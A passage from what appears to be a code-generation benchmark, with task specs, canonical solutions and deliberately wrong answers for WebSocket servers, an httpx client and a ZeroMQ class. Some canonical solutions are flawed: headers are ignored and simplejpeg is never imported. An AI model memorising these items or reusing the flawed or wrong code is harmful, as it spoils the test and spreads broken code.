    "Instruction": "Task Description: Implement a WebSocket server interface that manages client connections and facilitates message broadcasting in a synchronous manner using asyncio and threading.\n\nClass Description: SyncWebSocketInterface is a class that provides a synchronous interface to an asynchronous WebSocket server. It manages client connections, handles message broadcasting to all connected clients, and runs the asyncio event loop in a separate thread to maintain responsiveness.\n\nAttributes:\n\nclients: [set] - A set of connected WebSocket clients.\nloop: [asyncio.AbstractEventLoop] - The asyncio event loop used for WebSocket operations.\nthread: [threading.Thread] - The thread running the asyncio event loop.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the WebSocket interface, creates a new event loop, and starts it in a separate thread.\n_run_event_loop: [Name]() -> [None] - Internal method that runs the asyncio event loop in the dedicated thread.\n_run_async: [Name](coroutine) -> [None] - Runs a coroutine in the asyncio event loop from another thread.\n_send_to_all_clients: [Name](clients, msg) -> [None] - Internal async method to send a message to all specified clients.\nregister_client: [Name](websocket) -> [None] - Registers a new WebSocket client to the set of connected clients.\nunregister_client: [Name](websocket) -> [None] - Removes a WebSocket client from the set of connected clients.\ninternal_monologue: [Name](msg) -> [None] - Prints and broadcasts an internal monologue message to all clients.\nassistant_message: [Name](msg) -> [None] - Prints and broadcasts an assistant message to all clients.\nfunction_message: [Name](msg) -> [None] - Prints and broadcasts a function message to all clients.\nclose: [Name]() -> [None] - Stops the event loop and joins the thread, cleaning up resources.",
    "Canonical_solution": "import asyncio\nimport threading\nimport letta.server.ws_api.protocol as protocol\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop, daemon=True)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        try:\n            self.loop.run_forever()\n        finally:\n            self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n            self.loop.close()\n\n    def _run_async(self, coroutine):\n        if not self.loop.is_closed():\n            asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n\n    async def _send_to_all_clients(self, clients, msg):\n        if clients:\n            await asyncio.gather(*(client.send_text(msg) for client in clients))\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_internal_monologue(msg)))\n\n    def assistant_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_assistant_message(msg)))\n\n    def function_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_function_message(msg)))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport threading\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        self.loop.run_forever()\n\n    def _run_async(self, coroutine):\n        self.loop.run_until_complete(coroutine)\n\n    async def _send_to_all_clients(self, msg):\n        for client in self.clients:\n            await client.send(msg)\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.discard(websocket)\n\n    def internal_monologue(self, msg):\n        print(f\"Internal Monologue: {msg}\")\n        self._run_async(self._send_to_all_clients(f\"Internal Monologue: {msg}\"))\n\n    def assistant_message(self, msg):\n        print(f\"Assistant Message: {msg}\")\n        self._run_async(self._send_to_all_clients(f\"Assistant Message: {msg}\"))\n\n    def function_message(self, msg):\n        print(f\"Function Message: {msg}\")\n        self._run_async(self._send_to_all_clients(f\"Function Message: {msg}\"))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echoing back a value, prompting for user input, and throwing an error message. The server runs indefinitely, maintaining persistent connections with clients.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nThe function processes incoming JSON messages with the following structure:\n{\n    \"function\": str - The operation to perform (\"echo\", \"ask\", or \"throw\"),\n    \"args\": list - Arguments for the specified function\n}\n\nThe function sends back JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures or unknown functions",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handle_connection(websocket, path):\n    try:\n        async for message in websocket:\n            data = json.loads(message)\n            function = data.get(\"function\")\n            args = data.get(\"args\", [])\n\n            if function == \"echo\":\n                result = args[0] if args else \"No argument provided\"\n                await websocket.send(json.dumps({\"return\": result}))\n            elif function == \"ask\":\n                await websocket.send(json.dumps({\"throw\": \"This function is not implemented yet.\"}))\n            elif function == \"throw\":\n                await websocket.send(json.dumps({\"throw\": \"This function is not implemented yet.\"}))\n            else:\n                await websocket.send(json.dumps({\"throw\": \"Unknown function.\"}))\n    except Exception as e:\n        print(f\"Error: {e}\")\n        await websocket.close()\n\nstart_server = websockets.serve(handle_connection, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON data, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (one of 'echo', 'ask', 'throw', or other),\n  \"args\": list (arguments for the specified function),\n  \"return\": any (will be populated in response),\n  \"throw\": any (will be populated in case of errors)\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import websockets\nimport asyncio\nimport json\n\nasync def handle_connection(websocket, path):\n    async for message in websocket:\n        data = json.loads(message)\n        function = data.get(\"function\")\n        args = data.get(\"args\", [])\n        return_val = None\n        error = None\n\n        try:\n            if function == \"echo\":\n                return_val = args\n            elif function == \"ask\":\n                return_val = \"Question asked\"\n            elif function == \"throw\":\n                raise ValueError(\"Custom error thrown\")\n            else:\n                return_val = \"Unknown function\"\n\n            await websocket.send(json.dumps({\n                \"return\": return_val\n            }))\n        except Exception as e:\n            error = str(e)\n            await websocket.send(json.dumps({\n                \"throw\": error\n            }))\n\nasync def start_websocket_server():\n    async with websockets.serve(handle_connection, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages and sending responses through the WebSocket connection)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": \"echo|ask|throw\",  // Operation to perform\n  \"args\": [...]                // Arguments for the operation\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handle_connection(websocket, path):\n    try:\n        async for message in websocket:\n            data = json.loads(message)\n            function = data.get(\"function\")\n            args = data.get(\"args\", [])\n\n            if function == \"echo\":\n                response = {\"result\": \"Echoed: \" + str(args)}\n            elif function == \"ask\":\n                response = {\"result\": \"Asked: \" + str(args)}\n            elif function == \"throw\":\n                response = {\"error\": \"Thrown: \" + str(args)}\n            else:\n                response = {\"error\": \"Unknown function\"}\n\n            await websocket.send(json.dumps(response))\n    except Exception as e:\n        print(f\"Error handling connection: {e}\")\n\nstart_websocket_server = websockets.serve(handle_connection, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_websocket_server)\nasyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, or throw), and returns appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (required, specifies operation: \"echo\", \"ask\", or \"throw\"),\n  \"args\": list (arguments for the specified function)\n}\n\nThe server returns JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import websockets\nimport asyncio\nimport json\n\nasync def handle_connection(websocket, path):\n    async for message in websocket:\n        data = json.loads(message)\n        function = data.get(\"function\")\n        args = data.get(\"args\", [])\n\n        if function == \"echo\":\n            response = {\"return\": args}\n        elif function == \"ask\":\n            response = {\"return\": \"You asked a question.\"}\n        elif function == \"throw\":\n            response = {\"throw\": \"An error occurred.\"}\n        else:\n            response = {\"throw\": \"Unknown function.\"}\n\n        await websocket.send(json.dumps(response))\n\nstart_server = websockets.serve(handle_connection, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle bidirectional communication between clients and the server, with support for message production and consumption through multiprocessing queues.\n\nFunction Description: The SocketWorker function establishes a WebSocket server that manages client connections, processes incoming messages, and sends messages to specific clients based on their unique IDs. It uses asynchronous programming to handle multiple clients concurrently.\n\nInput:\n- queueX: multiprocessing.Queue - Queue for outgoing messages to clients (format: (client_id, message))\n- queueZ: multiprocessing.Queue - Queue for incoming messages from clients (format: (client_id, message))\n\nOutput: None (The function runs indefinitely as a server process)\n\nMethods (nested async functions within SocketWorker):\n\n1. producer() -> Union[Tuple[str, str], str] - Generates messages to be sent to clients, either from queueX or periodic ping messages.\n\n2. producer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Handles sending messages to connected clients via the WebSocket connection.\n\n3. consumer(websocket: WebSocketServerProtocol, msg: str) -> None - Processes incoming messages from clients, handling pong responses and forwarding valid requests to queueZ.\n\n4. consumer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Continuously receives messages from a client connection and processes them.\n\n5. server(websocket: WebSocketServerProtocol, path: str) -> None - Main connection handler that manages client lifecycle, assigning unique IDs and coordinating producer/consumer tasks.\n\n6. srv_exception(loop: asyncio.AbstractEventLoop, context: dict) -> None - Exception handler for the WebSocket server event loop.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport signal\nimport json\nimport random\nimport time\nfrom multiprocessing import Queue\n\n_DEBUG_LEVEL_ = 2\nPORT_NUM = 8266\n\ndef SocketWorker(queueX, queueZ):\n    signal.signal(signal.SIGINT, signal.SIG_DFL)\n    USERS = set()\n\n    async def producer():\n        hasData = False\n        try:\n            K, out = queueX.get(timeout=0.05)\n            hasData = True\n        except:\n            pass\n        if hasData:\n            return (K, out)\n        else:\n            await asyncio.sleep(0.001)\n            if random.random() < -0.003:\n                return '[PING]'\n            else:\n                return ''\n\n    async def producer_handler(websocket, path):\n        while True:\n            msg = await producer()\n            if isinstance(msg, tuple):\n                K, msg = msg\n                for x in USERS:\n                    if x.client_id == K:\n                        await x.send(msg)\n                        break\n            elif msg != '':\n                await websocket.send(msg)\n\n    async def consumer(websocket, msg):\n        if msg == '[PONG]':\n            return\n        try:\n            msg = json.loads(msg)\n            if msg['op'].lower() == 'get':\n                queueZ.put((websocket.client_id, msg['txt']))\n        except Exception as e:\n            print(e)\n            pass\n\n    async def consumer_handler(websocket, path):\n        while True:\n            msg = await websocket.recv()\n            await consumer(websocket, msg)\n\n    async def server(websocket, path):\n        websocket.client_id = '%020x' % random.randrange(16**20)\n        USERS.add(websocket)\n        print(\"[ws connect]\", len(USERS), 'users @',\n              time.strftime(\"%Y %b %d %H:%M:%S\", time.localtime(time.time())))\n        try:\n            await websocket.send('id_' + websocket.client_id)\n            consumer_task = asyncio.ensure_future(\n                consumer_handler(websocket, path))\n            producer_task = asyncio.ensure_future(\n                producer_handler(websocket, path))\n            done, pending = await asyncio.wait(\n                [consumer_task, producer_task],\n                return_when=asyncio.FIRST_COMPLETED)\n            for task in pending:\n                task.cancel()\n        finally:\n            USERS.remove(websocket)\n            print(\"[ws disconnect]\", len(USERS))\n\n    def srv_exception(loop, context):\n        if _DEBUG_LEVEL_ > 1:\n            print('exception', loop, context)\n        pass\n\n    try:\n        start_server = websockets.serve(server, \"127.0.0.1\", PORT_NUM)\n        asyncio.get_event_loop().run_until_complete(start_server)\n        asyncio.get_event_loop().set_exception_handler(srv_exception)\n        asyncio.get_event_loop().run_forever()\n    except Exception as e:\n        print('[srv error]', e)",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "async def SocketWorker(queueX, queueZ):\n    async def producer():\n        while True:\n            try:\n                item = queueX.get_nowait()\n                yield item\n            except queue.Empty:\n                await asyncio.sleep(1)\n                yield (\"ping\", \"ping\")\n\n    async def producer_handler(websocket, path):\n        async for msg in producer():\n            if msg[0] == \"ping\":\n                await websocket.send(msg[1])\n            else:\n                client_id, message = msg\n                await websocket.send(f\"Message from server to {client_id}: {message}\")\n\n    async def consumer(websocket, msg):\n        client_id, message = msg\n        if message.lower() == \"pong\":\n            return\n        queueZ.put_nowait((client_id, message))\n\n    async def consumer_handler(websocket, path):\n        async for msg in websocket:\n            await consumer(websocket, msg)\n\n    async def server(websocket, path):\n        client_id = str(uuid.uuid4())\n        await websocket.send(f\"Welcome, client {client_id}\")\n        asyncio.create_task(producer_handler(websocket, path))\n        asyncio.create_task(consumer_handler(websocket, path))\n\n    async def srv_exception(loop, context):\n        print(context)\n\n    start_server = websockets.serve(server, \"localhost\", 8765, ssl=None)\n    asyncio.get_event_loop().run_until_complete(start_server)\n    asyncio.get_event_loop().add_signal_handler(signal.SIGINT, loop.stop)\n    asyncio.get_event_loop().add_signal_handler(signal.SIGTERM, loop.stop)\n    asyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that can send various types of HTTP requests (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS) and return the response.\n\nFunction Description: The function `make_http_request` is an asynchronous HTTP client that sends HTTP requests using the `httpx` library. It supports multiple HTTP methods and can handle both raw content and JSON data for POST requests. The function uses a context manager to ensure proper resource management and returns the HTTP response object.\n\nInput:\n- `url`: str - The target URL for the HTTP request.\n- `method`: str (optional, default=\"GET\") - The HTTP method to use (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS).\n- `content`: typing.Optional[bytes] (optional) - Raw bytes content to send in the request body (for POST, PUT, PATCH).\n- `json`: typing.Optional[dict] (optional) - JSON data to send in the request body (for POST).\n- `headers`: typing.Optional[dict] (optional) - Custom headers to include in the request.\n\nOutput:\n- `httpx.Response` - The HTTP response object containing status code, headers, and response body.",
    "Canonical_solution": "import httpx\nimport typing\nfrom datetime import timedelta\n\nasync def make_http_request(url: str, method: str = \"GET\", content: typing.Optional[bytes] = None, json: typing.Optional[dict] = None, headers: typing.Optional[dict] = None) -> httpx.Response:\n    async with httpx.AsyncClient() as client:\n        if method == \"GET\":\n            response = await client.get(url)\n        elif method == \"POST\":\n            if content:\n                response = await client.post(url, content=content)\n            elif json:\n                response = await client.post(url, json=json)\n        elif method == \"PUT\":\n            response = await client.put(url, content=content)\n        elif method == \"DELETE\":\n            response = await client.delete(url)\n        elif method == \"PATCH\":\n            response = await client.patch(url, content=content)\n        elif method == \"HEAD\":\n            response = await client.head(url)\n        elif method == \"OPTIONS\":\n            response = await client.options(url)\n        \n        return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "async def make_http_request(url, method=\"GET\", content=None, json=None, headers=None):\n    async with httpx.AsyncClient() as client:\n        if method == \"GET\":\n            response = await client.get(url, headers=headers)\n        elif method == \"POST\":\n            if content is not None:\n                response = await client.post(url, content=content, headers=headers)\n            elif json is not None:\n                response = await client.post(url, json=json, headers=headers)\n            else:\n                response = await client.post(url, headers=headers)\n        elif method == \"PUT\":\n            if content is not None:\n                response = await client.put(url, content=content, headers=headers)\n            elif json is not None:\n                response = await client.put(url, json=json, headers=headers)\n            else:\n                response = await client.put(url, headers=headers)\n        elif method == \"DELETE\":\n            response = await client.delete(url, headers=headers)\n        elif method == \"PATCH\":\n            if content is not None:\n                response = await client.patch(url, content=content, headers=headers)\n            elif json is not None:\n                response = await client.patch(url, json=json, headers=headers)\n            else:\n                response = await client.patch(url, headers=headers)\n        elif method == \"HEAD\":\n            response = await client.head(url, headers=headers)\n        elif method == \"OPTIONS\":\n            response = await client.options(url, headers=headers)\n        else:\n            raise ValueError(f\"Unsupported HTTP method: {method}\")\n        return response"
  },
  {
    "Task_id": 477,
    "Instruction": "Task Description: Implement a ZeroMQ-based network communication class that supports PUB/SUB pattern for sending and receiving messages between processes, with optional frame compression and message handling.\n\nClass Description: NetGear is a ZeroMQ wrapper class that facilitates network communication using various messaging patterns, with a focus on PUB/SUB pattern. It handles socket creation, connection management, message serialization, and frame compression/decompression.\n\nAttributes:\n- __logging: bool - Enables/disables logging functionality\n- __msg_context: zmq.Context - ZeroMQ context instance for socket management\n- __receive_mode: bool - Flag indicating if instance is in receive mode\n- __pattern: int - Selected messaging pattern (0: PAIR, 1: REQ/REP, 2: PUB/SUB)\n- __terminate: bool - Flag for graceful termination\n- __msg_socket: zmq.Socket - ZeroMQ socket instance\n- __subscriber_timeout: int - Timeout value for subscriber socket (in seconds)\n- __queue: deque - Buffer for storing received frames (receiver only)\n- __thread: Thread - Background thread for message handling (receiver only)\n\nMethods:\n- __init__(address=None, port=None, protocol=None, pattern=0, receive_mode=False, logging=False, **options) -> None - Initializes the NetGear instance with specified parameters\n- __recv_handler() -> None - Internal thread handler for receiving messages (receiver only)\n- recv() -> np.ndarray|None - Receives and returns a frame from the queue (receiver only)\n- send(frame, message=None) -> None - Sends a frame with optional metadata (sender only)\n- close(kill=False) -> None - Closes the connection and cleans up resources",
    "Canonical_solution": "import os\nimport time\nimport asyncio\nimport platform\nimport string\nimport secrets\nimport numpy as np\nimport logging as log\nfrom threading import Thread\nfrom collections import deque\nfrom os.path import expanduser\nimport zmq\nfrom zmq import auth\nfrom zmq.auth.thread import ThreadAuthenticator\nfrom zmq.error import ZMQError\n\nclass NetGear:\n    def __init__(\n        self,\n        address=None,\n        port=None,\n        protocol=None,\n        pattern=0,\n        receive_mode=False,\n        logging=False,\n        **options\n    ):\n        self.__logging = logging if isinstance(logging, bool) else False\n        self.__msg_context = zmq.Context.instance()\n        self.__receive_mode = receive_mode\n        self.__pattern = pattern\n        self.__terminate = False\n\n        valid_messaging_patterns = {\n            0: (zmq.PAIR, zmq.PAIR),\n            1: (zmq.REQ, zmq.REP),\n            2: (zmq.PUB, zmq.SUB),\n        }\n\n        msg_pattern = valid_messaging_patterns[pattern]\n        self.__msg_socket = self.__msg_context.socket(msg_pattern[1 if receive_mode else 0])\n\n        if pattern == 2:  # PUB/SUB pattern\n            if receive_mode:  # SUB socket\n                self.__msg_socket.setsockopt_string(zmq.SUBSCRIBE, \"\")\n                self.__subscriber_timeout = options.get('subscriber_timeout', None)\n                if self.__subscriber_timeout:\n                    self.__msg_socket.setsockopt(zmq.RCVTIMEO, self.__subscriber_timeout * 1000)\n                    self.__msg_socket.setsockopt(zmq.LINGER, 0)\n            else:  # PUB socket\n                self.__msg_socket.set_hwm(1)\n\n        if receive_mode:\n            address = \"*\" if address is None else address\n            port = \"5555\" if port is None else port\n            self.__msg_socket.bind(f\"{protocol}://{address}:{port}\")\n        else:\n            address = \"localhost\" if address is None else address\n            port = \"5555\" if port is None else port\n            self.__msg_socket.connect(f\"{protocol}://{address}:{port}\")\n\n        if receive_mode and pattern == 2:\n            self.__queue = deque(maxlen=96)\n            self.__thread = Thread(target=self.__recv_handler, name=\"NetGear\")\n            self.__thread.daemon = True\n            self.__thread.start()\n\n    def __recv_handler(self):\n        while not self.__terminate:\n            try:\n                msg_json = self.__msg_socket.recv_json(flags=zmq.NOBLOCK)\n                msg_data = self.__msg_socket.recv(flags=zmq.NOBLOCK)\n                \n                if msg_json[\"terminate_flag\"]:\n                    self.__terminate = True\n                    self.__queue.append(None)\n                    break\n\n                if msg_json[\"compression\"]:\n                    frame = simplejpeg.decode_jpeg(\n                        msg_data,\n                        colorspace=msg_json[\"compression\"][\"colorspace\"],\n                        fastdct=msg_json[\"compression\"][\"dct\"],\n                        fastupsample=msg_json[\"compression\"][\"ups\"],\n                    )\n                else:\n                    frame_buffer = np.frombuffer(msg_data, dtype=msg_json[\"dtype\"])\n                    frame = frame_buffer.reshape(msg_json[\"shape\"])\n\n                self.__queue.append(frame)\n\n            except zmq.ZMQError as e:\n                if e.errno == zmq.EAGAIN:\n                    time.sleep(0.00001)\n                    continue\n                else:\n                    self.__terminate = True\n                    self.__queue.append(None)\n                    break\n\n    def recv(self):\n        if not self.__receive_mode or self.__pattern != 2:\n            raise ValueError(\"recv() can only be used in receive mode with PUB/SUB pattern\")\n\n        while not self.__terminate:\n            if len(self.__queue) > 0:\n                return self.__queue.popleft()\n            time.sleep(0.00001)\n        return None\n\n    def send(self, frame, message=None):\n        if self.__receive_mode or self.__pattern != 2:\n            raise ValueError(\"send() can only be used in send mode with PUB/SUB pattern\")\n\n        exit_flag = True if (frame is None or self.__terminate) else False\n\n        msg_dict = {\n            \"terminate_flag\": exit_flag,\n            \"compression\": False,\n            \"message\": message,\n            \"pattern\": str(self.__pattern),\n            \"dtype\": str(frame.dtype),\n            \"shape\": frame.shape\n        }\n\n        self.__msg_socket.send_json(msg_dict, zmq.SNDMORE)\n        self.__msg_socket.send(frame, copy=False)\n\n    def close(self, kill=False):\n        self.__terminate = True\n        if self.__receive_mode and self.__pattern == 2:\n            if self.__thread is not None:\n                if kill:\n                    self.__msg_context.destroy()\n                self.__thread.join()\n                self.__thread = None\n        self.__msg_socket.close(linger=0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "wrong_result": "import zmq\nfrom collections import deque\nfrom threading import Thread\nimport numpy as np\n\nclass NetGear:\n    def __init__(self, address=None, port=None, protocol=None, pattern=0, receive_mode=False, logging=False, **options):\n        self.__logging = logging\n        self.__msg_context = zmq.Context()\n        self.__receive_mode = receive_mode\n        self.__pattern = pattern\n        self.__terminate = False\n        self.__msg_socket = None\n        self.__subscriber_timeout = 5\n        self.__queue = deque()\n        self.__thread = None\n\n        if address is None and port is None:\n            raise ValueError(\"Either address or port must be provided\")\n\n        if protocol is None:\n            protocol = \"tcp\"\n\n        if pattern == 0:\n            self.__msg_socket = self.__msg_context.socket(zmq.PAIR)\n        elif pattern == 1:\n            self.__msg_socket = self.__msg_context.socket(zmq.REQ)\n            self.__msg_socket.setsockopt(zmq.RCVTIMEO, self.__subscriber_timeout * 1000000)\n        elif pattern == 2:\n            self.__msg_socket = self.__msg_context.socket(zmq.PUB)\n            self.__msg_socket.setsockopt(zmq.RCVTIMEO, self.__subscriber_timeout * 1000000)\n        else:\n            raise ValueError(\"Invalid pattern\")\n\n        if receive_mode:\n            self.__thread = Thread(target=self.__recv_handler)\n            self.__thread.start()\n\n        if address:\n            self.__msg_socket.connect(f\"{protocol}://{address}:{port}\")\n        else:\n            self.__msg_socket.bind(f\"{protocol}://*:{port}\")\n\n    def __recv_handler(self):\n        while not self.__terminate:\n            try:\n                frame = self.__msg_socket.recv()\n                self.__queue.append(frame)\n            except zmq.Again:\n                pass\n\n    def recv(self):\n        if not self.__receive_mode:\n            return None\n        if self.__queue:\n            return np.frombuffer(self.__queue.popleft(), dtype=np.uint8)\n        return None\n\n    def send(self, frame, message=None):\n        if self.__pattern == 2:\n            self.__msg_socket.send(frame)\n        else:\n            self.__msg_socket.send(frame)\n            if message:\n                self.__msg_socket.send(message)\n\n    def close(self, kill=False):\n        self.__terminate = True\n        if self.__thread and self.__thread.is_alive():\n            self.__thread.join()\n        self.__msg_socket.close()\n        self.__msg_context.term()"
  },
  {
    "Task_id": 478,
